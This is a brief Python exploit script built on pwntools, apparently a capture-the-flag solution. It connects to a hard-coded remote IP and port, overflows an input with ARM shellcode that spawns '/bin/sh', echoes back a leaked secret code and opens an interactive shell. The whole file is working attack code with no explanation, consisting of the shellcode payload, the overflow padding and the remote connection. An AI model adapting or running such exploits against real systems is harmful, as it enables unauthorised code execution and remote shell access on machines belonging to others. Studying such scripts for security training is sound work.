from pwn import *

context.log_level='debug'
p = remote('15.165.92.159', 1234)
#p = remote('localhost', 1234)

#gdb.attach(p)
test_shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78"
p.sendafter('> ', "\x00"*0x10+test_shellcode + "A"*(0x90-len(test_shellcode)))
p.sendlineafter('> ', '1')

p.recvuntil('code : ')
secret_code = int(p.recvuntil('\n'), 16)
log.info('secret code : ' + hex(secret_code))
p.sendlineafter('Code? :> ', hex(secret_code))
p.interactive()


